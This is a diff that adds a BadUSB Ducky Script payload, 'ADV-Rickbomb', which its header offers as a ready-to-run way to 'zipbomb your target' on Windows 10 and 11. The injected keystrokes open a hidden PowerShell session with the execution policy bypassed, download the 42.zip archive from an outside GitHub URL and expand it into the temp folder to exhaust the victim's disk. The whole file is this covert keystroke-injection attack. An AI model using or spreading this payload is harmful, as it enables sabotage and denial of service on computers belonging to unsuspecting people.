@@ -1,0 +1,11 @@
+REM     Title: ADV-Rickbomb
+REM     Author: FalsePhilosopher (I am Jakoby wrote all of this, I just modified it. Big up's to Jakoby for the quick launch!)
+REM     Description: This is a one liner payload that will zipbomb your target.
+REM     Target: Windows 10, 11
+REM     --------------------------------------------------------------------------------------
+REM     THIS PAYLOAD IS PLUG AND PLAY. NO MODIFICATIONS NEEDED SIMPLY RUN THE CODE DOWN BELOW.
+REM     --------------------------------------------------------------------------------------
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $U='https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Misc/42.zip';$Z="$env:TMP"+'\42.zip';$D="$env:TMP"+'\rr';iwr -Uri $U -O $Z;Expand-Archive $Z -DestinationPath $D\ -Force
+ENTER
